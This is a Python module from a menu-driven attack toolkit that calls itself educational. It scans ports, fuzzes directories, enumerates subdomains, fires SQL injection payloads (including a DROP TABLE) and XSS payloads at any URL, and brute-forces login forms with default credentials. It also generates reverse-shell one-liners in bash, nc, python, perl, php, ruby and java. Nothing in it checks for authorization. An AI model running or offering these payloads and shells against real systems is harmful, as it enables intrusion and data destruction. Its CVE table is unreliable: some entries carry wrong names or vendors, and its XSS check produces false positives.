# -*- coding: utf-8 -*-
"""CST (Cyber Security Test) — tools edukasi & quick check.

Core zero-dependency: socket bawaan Python.
Optional: requests, beautifulsoup4 (jika di-install).
External tools: nmap, subfinder, etc (deteksi runtime).
"""

import socket
import shutil
import subprocess
import sys
import time

from . import config
from .i18n import t

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# --- Eksternal tool detection ---

def _detect_nmap():
    nmap = shutil.which("nmap")
    if nmap:
        return nmap
    print(t("cst.nmap_missing"))
    return None

def _detect_subfinder():
    return shutil.which("subfinder")

def _detect_sqlmap():
    return shutil.which("sqlmap")


# --- Helper ---

def _scan_port(target, port, timeout=1):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        result = s.connect_ex((target, port))
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except (OSError, KeyError):
                service = "unknown"
            return port, service
    except Exception:
        pass
    finally:
        s.close()
    return None


def _get_banner(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = s.recv(256).decode("utf-8", errors="ignore").strip()
        s.close()
        return banner.split("\n")[0] if banner else ""
    except Exception:
        return ""


# --- CST Menu ---

def cst_menu():
    print(config.divider())
    print(t("cst.menu_title"))
    print(config.divider())
    items = [
        ("1", "cst.menu.port"),
        ("2", "cst.menu.dir_fuzz"),
        ("3", "cst.menu.subdomain"),
        ("4", "cst.menu.sqli"),
        ("5", "cst.menu.xss"),
        ("6", "cst.menu.login"),
        ("7", "cst.menu.rev_shell"),
        ("8", "cst.menu.cve"),
    ]
    for num, key in items:
        print(f"  {num}. {t(key)}")
    print(f"  0. {t('cst.menu.exit')}")
    print(config.divider())


def handle_cst(arg):
    """Entry point: CST <sub-command> | CST (interactive menu)."""
    arg = arg.strip()
    if not arg:
        cst_interactive()
        return

    parts = arg.split(maxsplit=1)
    subcmd = parts[0].lower()
    rest = parts[1] if len(parts) > 1 else ""

    if subcmd == "port":
        target = rest.strip() or input(t("cst.target_prompt")).strip()
        port_scanner(target)
    elif subcmd == "fuzz":
        target = rest.strip() or input(t("cst.target_prompt")).strip()
        directory_fuzzer(target)
    elif subcmd == "subdomain":
        target = rest.strip() or input(t("cst.target_prompt")).strip()
        subdomain_enum(target)
    elif subcmd == "sqli":
        target = rest.strip() or input(t("cst.target_prompt")).strip()
        sqli_scanner(target)
    elif subcmd == "xss":
        target = rest.strip() or input(t("cst.target_prompt")).strip()
        xss_scanner(target)
    elif subcmd == "login":
        target = rest.strip() or input(t("cst.target_prompt")).strip()
        login_tester(target)
    elif subcmd == "revshell":
        reverse_shell_gen()
    elif subcmd == "cve":
        target = rest.strip() or input(t("cst.target_prompt")).strip()
        cve_check(target)
    elif subcmd in ("menu", "help", "?"):
        cst_menu()
    else:
        print(t("cst.usage"))


def cst_interactive():
    """Menu interaktif penuh (seperti TG)."""
    config.clear_screen()
    while True:
        cst_menu()
        try:
            choice = input(t("cst.input_choice")).strip()
        except (KeyboardInterrupt, EOFError):
            print()
            break

        if not choice:
            config.clear_screen()
            continue

        if choice == "0" or choice.lower() == "exit":
            print(t("cst.exiting"))
            break

        tools = {
            "1": ("port", t("cst.port_title")),
            "2": ("fuzz", t("cst.dir_fuzz_title")),
            "3": ("subdomain", t("cst.subdomain_title")),
            "4": ("sqli", t("cst.sqli_title")),
            "5": ("xss", t("cst.xss_title")),
            "6": ("login", t("cst.login_title")),
            "7": ("revshell", t("cst.rev_shell_title")),
            "8": ("cve", t("cst.cve_title")),
        }

        if choice in tools:
            cmd_key, title = tools[choice]
            print(f"\n{t('cst.selected')} {config.GREEN_NEON}{title}{config.RESET}")
            handle_cst(f"{cmd_key}")
            input(f"\n{t('cst.press_enter')}")
            config.clear_screen()
        else:
            print(t("cst.bad_choice"))


# --- 1. Port Scanner ---

def port_scanner(target):
    if not target:
        print(t("cst.target_required"))
        return

    print(f"\n{t('cst.scanning')} {target}")

    nmap = _detect_nmap()
    default_range = input(t("cst.port_range")).strip() or "1-1024"

    if "-" in default_range:
        start, end = default_range.split("-")
        start, end = int(start.strip()), int(end.strip())
    elif default_range.isdigit():
        start, end = 1, int(default_range)
    else:
        print(t("cst.range_error"))
        return

    if nmap:
        _port_scan_nmap(target, nmap, start, end)
    else:
        _port_scan_python(target, start, end)


def _port_scan_nmap(target, nmap, start, end):
    try:
        result = subprocess.run(
            [nmap, "-p", f"{start}-{end}", "-T4", target],
            capture_output=True, text=True, timeout=120
        )
        output = result.stdout
        print(output)
        open_ports = []
        for line in output.split("\n"):
            if "/tcp" in line and "open" in line:
                port_part = line.split("/")[0].strip()
                service_part = line.split()[-1] if line.split() else "unknown"
                open_ports.append((port_part, service_part))
        if open_ports:
            print(f"\n{t('cst.found_ports')} {len(open_ports)}:")
            for p, s in open_ports:
                print(f"  {config.GREEN_NEON}{p}/tcp{config.RESET} open {s}")
        else:
            print(f"\n{t('cst.no_open_ports')}")
    except subprocess.TimeoutExpired:
        print(t("cst.scan_timeout"))
    except Exception as e:
        print(t("cst.scan_error", e=e))


def _port_scan_python(target, start, end):
    found = []
    total = end - start + 1
    current = [0]
    for port in range(start, end + 1):
        current[0] += 1
        if current[0] % 50 == 0 or current[0] == total:
            print(f"\r  {t('cst.scanning_progress', current=current[0], total=total)}", end="", flush=True)
        result = _scan_port(target, port)
        if result:
            port, service = result
            found.append(result)
            print(f"\r  [{config.GREEN_NEON}+{config.RESET}] {port}/tcp open {service}")
    print(f"\n\n{t('cst.found_ports')} {len(found)}:")
    for p, s in found:
        print(f"  {config.GREEN_NEON}{p}/tcp{config.RESET} open {s}")
    if not found:
        print(f"  {t('cst.no_open_ports')}")


# --- 2. Directory Fuzzer ---

DIR_WORDLIST = [
    "admin", "login", "dashboard", "panel", "api", "api/v1", "api/v2",
    "user", "users", "profile", "accounts", "settings", "config", "backup",
    "uploads", "images", "css", "js", "js/assets", "fonts", "docs",
    "forum", "blog", "news", "search", "test", "temp", "tmp",
    "phpmyadmin", "mysql", "wp-admin", "wp-content", "wp-login",
    ".git", ".env", ".htaccess", "robots.txt", "sitemap.xml",
    "cgi-bin", "server-status", "server-info", "info", "phpinfo",
    "download", "files", "media", "static", "public", "private",
    "secret", "internal", "manager", "cpanel", "webmail", "mail",
    "login.php", "index.php", "index.html", "default.html",
    "admin.php", "admin/login", "api/auth", "api/login",
    "swagger", "graphql", "rest", "v1", "v2", "v3",
    "db", "database", "dbadmin", "mongo", "redis",
    "status", "health", "ping", "metrics", "monitor",
    "dev", "development", "staging", "prod", "production",
    "app", "application", "home", "main", "site",
    "register", "signup", "sign-in", "logout", "forgot",
    "reset", "verify", "email", "otp", "token",
    "upload", "import", "export", "backup.zip", "database.sql",
]

def directory_fuzzer(url):
    if not url:
        print(t("cst.target_required"))
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    print(f"\n{t('cst.dir_fuzz_title')}: {url}")
    print(t("cst.dir_fuzz_wordlist"))

    wordlist_input = input(t("cst.wordlist")).strip()
    if wordlist_input:
        try:
            with open(wordlist_input) as f:
                words = [l.strip() for l in f if l.strip()]
        except Exception:
            print(t("cst.wordlist_error"))
            words = DIR_WORDLIST
    else:
        words = DIR_WORDLIST

    found = []
    total = len(words)
    for i, word in enumerate(words, 1):
        for protocol in ("https", "http"):
            test_url = f"{protocol}://{url.rstrip('/')}/{word}"
            try:
                if HAS_REQUESTS:
                    resp = requests.get(test_url, timeout=5, allow_redirects=False)
                    if resp.status_code != 404:
                        found.append((test_url, resp.status_code))
                        print(f"  [{config.GREEN_NEON}+{config.RESET}] {resp.status_code} {test_url}")
                else:
                    import urllib.request
                    req = urllib.request.Request(test_url)
                    try:
                        resp = urllib.request.urlopen(req, timeout=5)
                        found.append((test_url, resp.status))
                        print(f"  [{config.GREEN_NEON}+{config.RESET}] {resp.status} {test_url}")
                    except urllib.error.HTTPError as e:
                        if e.code != 404:
                            found.append((test_url, e.code))
                            print(f"  [{config.GREEN_NEON}+{config.RESET}] {e.code} {test_url}")
                    except Exception:
                        pass
            except Exception:
                pass
        if i % 20 == 0 or i == total:
            print(f"\r  {t('cst.fuzz_progress', current=i, total=total)}", end="", flush=True)

    print(f"\n\n{t('cst.fuzz_found')} {len(found)} paths:")
    for u, s in found:
        print(f"  {config.GREEN_NEON}{s}{config.RESET} {u}")
    if not found:
        print(f"  {t('cst.fuzz_none')}")


# --- 3. Subdomain Enum ---

def subdomain_enum(domain):
    if not domain:
        print(t("cst.target_required"))
        return

    print(f"\n{t('cst.subdomain_title')}: {domain}")

    subfinder = _detect_subfinder()
    if subfinder:
        _subdomain_subfinder(domain, subfinder)
    else:
        _subdomain_bruteforce(domain)


def _subdomain_subfinder(domain, subfinder):
    try:
        result = subprocess.run(
            [subfinder, "-d", domain],
            capture_output=True, text=True, timeout=60
        )
        subs = [l.strip() for l in result.stdout.split("\n") if l.strip()]
        print(f"\n{t('cst.subdomain_found')} {len(subs)}:")
        for s in subs:
            print(f"  {config.CYAN}{s}{config.RESET}")
    except subprocess.TimeoutExpired:
        print(t("cst.scan_timeout"))
    except Exception as e:
        print(t("cst.scan_error", e=e))


def _subdomain_bruteforce(domain):
    print(t("cst.subdomain_no_subfinder"))
    common_subs = [
        "www", "mail", "ftp", "cpanel", "whm", "admin", "blog", "dev",
        "staging", "test", "api", "portal", "shop", "store", "app",
        "support", "help", "docs", "wiki", "forum", "community",
        "secure", "login", "auth", "sso", "vpn", "remote",
        "ns1", "ns2", "ns3", "ns4", "mx", "mx1", "mx2",
        "webmail", "smtp", "pop", "imap", "rt", "monitor",
        "cdn", "cdn1", "cdn2", "cdn3", "static", "media",
        "img", "images", "assets", "static1", "media1",
        "portal", "dashboard", "panel", "control", "paneler",
    ]
    found = []
    total = len(common_subs)
    for i, sub in enumerate(common_subs, 1):
        target = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(target)
            found.append((target, ip))
            print(f"  [{config.GREEN_NEON}+{config.RESET}] {target} -> {ip}")
        except socket.gaierror:
            pass
        except Exception:
            pass
        if i % 10 == 0 or i == total:
            print(f"\r  {t('cst.subdomain_progress', current=i, total=total)}", end="", flush=True)

    print(f"\n\n{t('cst.subdomain_found')} {len(found)}:")
    for s, ip in found:
        print(f"  {config.CYAN}{s}{config.RESET} -> {ip}")
    if not found:
        print(f"  {t('cst.subdomain_none')}")


# --- 4. SQLi Scanner ---

def sqli_scanner(url):
    if not url:
        print(t("cst.target_required"))
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    print(f"\n{t('cst.sqli_title')}: {url}")

    test_params = ["id=", "q=", "search=", "cat=", "pid=", "page=", "article="]
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' -- ",
        "1' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' AND 1=2 UNION SELECT NULL--",
    ]

    if HAS_REQUESTS:
        _sqli_request(url, test_params, payloads)
    else:
        _sqli_urllib(url, test_params, payloads)


def _sqli_request(url, test_params, payloads):
    found = []
    for param in test_params:
        for payload in payloads:
            test_url = f"{url}{param}{payload}"
            try:
                resp = requests.get(test_url, timeout=10, allow_redirects=False)
                error_keywords = ["sql", "mysql", "syntax", "error", "warn", "union", "select"]
                body_lower = resp.text.lower()
                if any(kw in body_lower for kw in error_keywords) or resp.status_code == 500:
                    found.append((test_url, resp.status_code))
                    print(f"  [{config.RED}!{config.RESET}] {test_url}")
            except Exception:
                pass

    if found:
        print(f"\n{t('cst.sqli_found')} {len(found)}:")
        for u, s in found:
            print(f"  {config.RED}{s}{config.RESET} {u}")
    else:
        print(f"\n{t('cst.sqli_none')}")


def _sqli_urllib(url, test_params, payloads):
    import urllib.request
    import urllib.error

    found = []
    for param in test_params:
        for payload in payloads:
            test_url = f"{url}{param}{payload}"
            try:
                req = urllib.request.Request(test_url)
                try:
                    resp = urllib.request.urlopen(req, timeout=10)
                    body = resp.read().decode("utf-8", errors="ignore").lower()
                except urllib.error.HTTPError as e:
                    body = e.read().decode("utf-8", errors="ignore").lower()
                    if e.code == 500:
                        found.append((test_url, e.code))
                        print(f"  [{config.RED}!{config.RESET}] {test_url}")
                        continue
                error_keywords = ["sql", "mysql", "syntax", "error", "warn", "union", "select"]
                if any(kw in body for kw in error_keywords):
                    found.append((test_url, "err"))
                    print(f"  [{config.RED}!{config.RESET}] {test_url}")
            except Exception:
                pass

    if found:
        print(f"\n{t('cst.sqli_found')} {len(found)}:")
        for u, s in found:
            print(f"  {config.RED}{s}{config.RESET} {u}")
    else:
        print(f"\n{t('cst.sqli_none')}")


# --- 5. XSS Scanner ---

def xss_scanner(url):
    if not url:
        print(t("cst.target_required"))
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    print(f"\n{t('cst.xss_title')}: {url}")

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "\" onmouseover=\"alert(1)\"",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    ]

    if HAS_REQUESTS and HAS_BS4:
        _xss_request(url, xss_payloads)
    elif HAS_REQUESTS:
        _xss_request_no_bs4(url, xss_payloads)
    else:
        _xss_urllib(url, xss_payloads)


def _xss_check_body(body, payload):
    if payload in body:
        return True
    body_lower = body.lower()
    payload_lower = payload.lower()
    for tag in ["script", "img", "svg", "body", "iframe", "details", "input"]:
        if tag in payload_lower and tag in body_lower:
            return True
    return False


def _xss_request(url, payloads):
    found = []
    for payload in payloads:
        test_url = f"{url}?q={payload}"
        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False)
            if _xss_check_body(resp.text, payload):
                found.append((test_url, payload))
                print(f"  [{config.RED}!{config.RESET}] XSS vuln: {test_url[:80]}...")
        except Exception:
            pass

    if found:
        print(f"\n{t('cst.xss_found')} {len(found)}:")
        for u, p in found:
            print(f"  {config.RED}!{config.RESET} {u}")
    else:
        print(f"\n{t('cst.xss_none')}")


def _xss_request_no_bs4(url, payloads):
    found = []
    for payload in payloads:
        test_url = f"{url}?q={payload}"
        try:
            resp = requests.get(test_url, timeout=10)
            if _xss_check_body(resp.text, payload):
                found.append((test_url, payload))
                print(f"  [{config.RED}!{config.RESET}] XSS vuln: {test_url[:80]}...")
        except Exception:
            pass

    if found:
        print(f"\n{t('cst.xss_found')} {len(found)}:")
        for u, p in found:
            print(f"  {config.RED}!{config.RESET} {u}")
    else:
        print(f"\n{t('cst.xss_none')}")


def _xss_urllib(url, payloads):
    import urllib.request
    import urllib.parse

    found = []
    for payload in payloads:
        test_url = f"{url}?q={urllib.parse.quote(payload)}"
        try:
            req = urllib.request.Request(test_url)
            try:
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                body = e.read().decode("utf-8", errors="ignore")
            if _xss_check_body(body, payload):
                found.append((test_url, payload))
                print(f"  [{config.RED}!{config.RESET}] XSS vuln: {test_url[:80]}...")
        except Exception:
            pass

    if found:
        print(f"\n{t('cst.xss_found')} {len(found)}:")
        for u, p in found:
            print(f"  {config.RED}!{config.RESET} {u}")
    else:
        print(f"\n{t('cst.xss_none')}")


# --- 6. Login Testing ---

def login_tester(url):
    if not url:
        print(t("cst.target_required"))
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    print(f"\n{t('cst.login_title')}: {url}")

    if HAS_BS4 and HAS_REQUESTS:
        _login_analyze(url)
    else:
        _login_simple(url)


def _login_analyze(url):
    try:
        resp = requests.get(url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            print(t("cst.login_no_form"))
            return

        print(f"\n{t('cst.login_forms')} {len(forms)}:")
        for i, form in enumerate(forms, 1):
            action = form.get("action", url)
            method = form.get("method", "GET").upper()
            inputs = form.find_all("input")
            input_names = [inp.get("name", "") for inp in inputs if inp.get("name")]
            print(f"  {i}. {method} {action}")
            print(f"     Fields: {', '.join(input_names) if input_names else t('cst.login_no_fields')}")

        print(f"\n{t('cst.login_brute_hint')}")
        do_brute = input(t("cst.brute_confirm")).strip().lower()
        if do_brute in ("y", "yes"):
            _login_brute(url, forms)
    except Exception as e:
        print(t("cst.scan_error", e=e))


def _login_simple(url):
    print(t("cst.login_simple_mode"))
    try:
        resp = requests.get(url, timeout=10)
        has_form = "<form" in resp.text.lower()
        if has_form:
            print(f"  {t('cst.login_has_form')}")
        else:
            print(f"  {t('cst.login_no_form')}")
    except Exception as e:
        print(t("cst.scan_error", e=e))


def _login_brute(url, forms):
    common_creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("root", "root"), ("root", "password"), ("root", "123456"),
        ("user", "user"), ("user", "password"), ("test", "test"),
        ("guest", "guest"), ("admin", "admin123"),
    ]
    print(f"\n{t('cst.brute_start')}...")
    for i, (user, pw) in enumerate(common_creds, 1):
        try:
            data = {}
            for form in forms:
                inputs = form.find_all("input")
                for inp in inputs:
                    name = inp.get("name", "")
                    if "user" in name.lower() or "name" in name.lower() or "user" == name:
                        data[name] = user
                    if "pass" in name.lower() or "password" in name.lower() or "pw" == name:
                        data[name] = pw
            if not data:
                data["username"] = user
                data["password"] = pw
            resp = requests.post(url, data=data, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 1000:
                print(f"  [{config.RED}!{config.RESET}] {user}:{pw} -> status {resp.status_code}")
        except Exception:
            pass
    print(f"\n{t('cst.brute_done')}")


# --- 7. Reverse Shell Gen ---

REV_SHELL_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc": "nc {ip} {port} -e /bin/bash",
    "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "php": "<?php $sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");?>",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "msf": "use exploit/multi/handler\nset payload {payload}\nset LHOST {ip}\nset LPORT {port}\nexploit",
    "ruby": "ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec(\"/bin/sh -i <&#{f} >&#{f} 2>&#{f}\")'",
}

REVERSE_PAYLOADS = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc_ncat": "nc -e /bin/sh {ip} {port}",
    "nc_traditional": "nc {ip} {port} -e /bin/bash",
    "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\');'",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "ruby": "ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec(\"/bin/sh -i <&#{f} >&#{f} 2>&#{f}\")'",
    "msf": "msfvenom -p {payload} LHOST={ip} LPORT={port} -f raw",
    "java": "r = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"});",
}

def reverse_shell_gen():
    print(f"\n{t('cst.rev_shell_title')}")
    print(t("cst.rev_shell_info"))

    ip = input(t("cst.lhost")).strip()
    port = input(t("cst.lport")).strip() or "4444"

    if not ip:
        print(t("cst.target_required"))
        return

    print(f"\n{t('cst.rev_shell_options')}")
    for i, (key, template) in enumerate(REV_SHELL_TEMPLATES.items(), 1):
        print(f"  {i}. {key}")

    try:
        choice = input(t("cst.input_choice")).strip()
        idx = int(choice) - 1
        keys = list(REV_SHELL_TEMPLATES.keys())
        if 0 <= idx < len(keys):
            selected = keys[idx]
            payload = REV_SHELL_TEMPLATES[selected].format(ip=ip, port=port)
            print(f"\n{t('cst.rev_shell_generated')} [{config.RED}{selected}{config.RESET}]:")
            print(config.divider())
            print(payload)
            print(config.divider())
            save = input(t("cst.save_payload")).strip().lower()
            if save in ("y", "yes"):
                fname = f"revshell_{selected}_{ip}_{port}.txt"
                with open(fname, "w") as f:
                    f.write(f"# Reverse Shell - {selected}\n# Target: {ip}:{port}\n# LHOST: {ip}\n# LPORT: {port}\n\n{payload}\n")
                print(t("cst.saved", path=fname))
        else:
            print(t("cst.bad_choice"))
    except ValueError:
        print(t("cst.bad_choice"))


# --- 8. CVE Check ---

CVE_DB = {
    "log4j": [
        ("CVE-2021-44228", "Critical", "Remote Code Execution via JNDI injection"),
        ("CVE-2021-45046", "Critical", "RCE in certain configurations"),
        ("CVE-2021-45105", "High", "DoS attack"),
        ("CVE-2021-44832", "Medium", "RCE with additional privileges"),
    ],
    "heartbleed": [
        ("CVE-2014-0160", "Critical", "OpenSSL memory leak - private key extraction"),
    ],
    "shellshock": [
        ("CVE-2014-6271", "Critical", "Bash environment variable injection"),
        ("CVE-2014-7169", "High", "Bash function injection"),
    ],
    "wordpress": [
        ("CVE-2023-0001", "High", "PHP unit test XSS"),
        ("CVE-2022-21661", "High", "Installation privilege escalation"),
    ],
    "apache": [
        ("CVE-2021-41773", "Critical", "Path traversal and RCE in Apache 2.4.49"),
        ("CVE-2021-42013", "Critical", "Path traversal and RCE in Apache 2.4.50"),
    ],
    "nginx": [
        ("CVE-2021-23017", "High", "DNS resolver off-by-one heap overflow"),
        ("CVE-2019-9511", "High", "HTTP/2 Rapid Reset"),
    ],
    "tomcat": [
        ("CVE-2020-1938", "High", "Ghostcat - AJP file read/include"),
        ("CVE-2021-42340", "High", "Remote code execution via Manager"),
    ],
}

def cve_check(target):
    if not target:
        print(t("cst.target_required"))
        return

    print(f"\n{t('cst.cve_title')}: {target}")
    print(t("cst.cve_info"))

    found = []
    target_lower = target.lower()

    for vuln_name, vulns in CVE_DB.items():
        if vuln_name in target_lower:
            found.extend(vulns)

    if not found:
        for vuln_name, vulns in CVE_DB.items():
            if vuln_name.replace("-", "") in target_lower.replace("-", ""):
                found.extend(vulns)

    if not found:
        print(f"\n{t('cst.cve_none')} \"{target}\"")
        print(f"  {t('cst.cve_known_targets')}")
        for name in CVE_DB:
            print(f"    - {name}")
        return

    print(f"\n{t('cst.cve_found')} {len(found)}:")
    for cve_id, severity, desc in found:
        color = config.RED if severity == "Critical" else (config.YELLOW if severity == "High" else config.CYAN)
        print(f"  {color}{cve_id} [{severity}]{config.RESET} - {desc}")

    save = input(f"\n{t('cst.save_cve')}").strip().lower()
    if save in ("y", "yes"):
        fname = f"cve_report_{target.replace(' ', '_')}.txt"
        with open(fname, "w") as f:
            f.write(f"# CVE Report for: {target}\n\n")
            for cve_id, severity, desc in found:
                f.write(f"{cve_id} [{severity}] - {desc}\n")
        print(t("cst.saved", path=fname))


# --- Entry point for pipe support ---

def cst_pipe_run(arg):
    """Jalankan sub-command CST dan kembalikan output sebagai string."""
    import io
    old_stdout = sys.stdout
    buf = io.StringIO()
    sys.stdout = buf
    try:
        handle_cst(arg)
    finally:
        sys.stdout = old_stdout
    return buf.getvalue()
